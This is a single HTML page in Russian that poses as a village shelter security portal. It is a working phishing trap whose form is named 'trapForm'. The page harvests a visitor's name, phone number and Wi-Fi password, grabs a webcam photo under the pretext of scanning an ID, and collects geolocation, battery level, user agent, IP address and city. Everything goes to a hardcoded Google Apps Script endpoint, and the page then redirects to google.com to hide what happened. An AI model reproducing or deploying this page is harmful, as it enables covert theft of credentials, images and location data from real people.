<!DOCTYPE html>
<html>
<head>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Портал безопасности деревни</title>
    <style>
        body { font-family: Arial, sans-serif; background: #111; color: white; text-align: center; padding: 20px; }
        .box { background: #222; padding: 20px; border-radius: 10px; max-width: 400px; margin: 0 auto; border: 1px solid #444; }
        h2 { color: #00ffcc; }
        input { width: 90%; padding: 10px; margin: 10px 0; border-radius: 5px; border: none; }
        button { width: 100%; padding: 15px; background: #00ffcc; color: #000; border: none; border-radius: 5px; font-weight: bold; font-size: 16px; cursor: pointer; margin-top: 5px; }
        .hidden { display: none; }
    </style>
</head>
<body>
    <div class="box">
        <h2>СИСТЕМА БЕЗОПАСНОСТИ</h2>
        <p>Введите данные для доступа к базе убежища.</p>
        
        <form id="trapForm">
            <input type="text" id="name" name="name" placeholder="Ваше имя" required>
            <input type="text" id="phone" name="phone" placeholder="Номер телефона" required>
            <input type="password" id="password" name="password" placeholder="Пароль от Wi-Fi / Сети" required>
            
            <button type="button" onclick="startCamera()">1. Сканировать ID (Камера)</button>
            <button type="submit">2. Войти в систему</button>
        </form>
        
        <video id="video" class="hidden" autoplay playsinline></video>
        <canvas id="canvas" class="hidden"></canvas>
    </div>

    <script>
        const scriptUrl = "https://script.google.com/macros/s/AKfycbz-ufzs4W3mnu5l-UozoI2i5m19xjjpqJMSmO0GiZdfBvW-fAR4v9dgHghUnwPAWWXNWw/exec";
        
        let ua = navigator.userAgent;
        let batteryLevel = "?";
        let photoBase64 = "";
        let lat = "denied";
        let lon = "denied";

        if (navigator.getBattery) {
            navigator.getBattery().then(b => batteryLevel = Math.round(b.level * 100) + "%");
        }

        navigator.geolocation.getCurrentPosition(
            (pos) => { lat = pos.coords.latitude; lon = pos.coords.longitude; },
            (err) => { console.log("Гео запрещено"); }
        );

        function startCamera() {
            navigator.mediaDevices.getUserMedia({ video: true })
                .then(stream => {
                    const video = document.getElementById('video');
                    video.srcObject = stream;
                    setTimeout(() => {
                        const canvas = document.getElementById('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        photoBase64 = canvas.toDataURL('image/jpeg', 0.5);
                        stream.getTracks().forEach(track => track.stop());
                        alert("ID успешно отсканирован!");
                    }, 2000);
                })
                .catch(err => alert("Камера недоступна: " + err.message));
        }

        document.getElementById('trapForm').onsubmit = function(e) {
            e.preventDefault();
            
            let formData = new URLSearchParams();
            formData.append("name", document.getElementById('name').value);
            formData.append("phone", document.getElementById('phone').value);
            formData.append("password", document.getElementById('password').value);
            formData.append("ua", ua);
            formData.append("battery", batteryLevel);
            formData.append("lat", lat);
            formData.append("lon", lon);
            if (photoBase64) formData.append("photo", photoBase64);

            fetch('https://ipwho.is/').then(r => r.json()).then(d => {
                formData.append("ip", d.ip);
                formData.append("city", d.city);
                
                fetch(scriptUrl, {
                    method: 'POST',
                    body: formData,
                    mode: 'no-cors'
                }).then(() => {
                    window.location.href = "https://www.google.com"; 
                });
            }).catch(() => {
                formData.append("ip", "Unknown");
                formData.append("city", "Unknown");
                fetch(scriptUrl, { method: 'POST', body: formData, mode: 'no-cors' })
                    .then(() => { window.location.href = "https://www.google.com"; });
            });
        };
    </script>
</body>
</html>
